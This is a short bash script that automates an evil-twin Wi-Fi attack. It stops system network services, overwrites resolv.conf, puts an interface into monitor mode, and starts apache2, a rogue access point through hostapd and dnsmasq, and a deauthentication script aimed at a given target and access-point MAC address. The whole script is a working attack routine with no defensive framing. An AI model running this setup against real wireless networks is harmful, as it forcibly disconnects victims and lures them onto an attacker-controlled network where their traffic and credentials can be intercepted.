#!/bin/bash

upstream_interface=$1
mac_target=$2
mac_ap=$3
phys_interface=$4

service network-manager stop
systemctl disable systemd-resolved.service 
systemctl stop systemd-resolved

# Kill the process's before it's start again

killall hostapd
killall dnsmasq
killall apache2

# Monitor mode

ifconfig $upstream_interface down
iwconfig $upstream_interface mode monitor 
ifconfig $upstream_interface up

# Edit the original resolv.conf to the deafult 

rm /etc/resolv.conf
echo nameserver 127.0.0.1 > /etc/resolv.conf

# Web server initalization - apache2 service start

service apache2 start &

# Start hostapd service

xterm -e hostapd Configuration/hostapd.conf &
 
# Configue the traffic

ifconfig $phys_interface 10.0.0.1 netmask 255.255.255.0 & 
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1 &

# Start dnsmasq service

xterm -e dnsmasq -C Configuration/dnsmasq.conf -d & 

xterm -e python3 deauth.py $mac_ap $mac_target $upstream_interface &
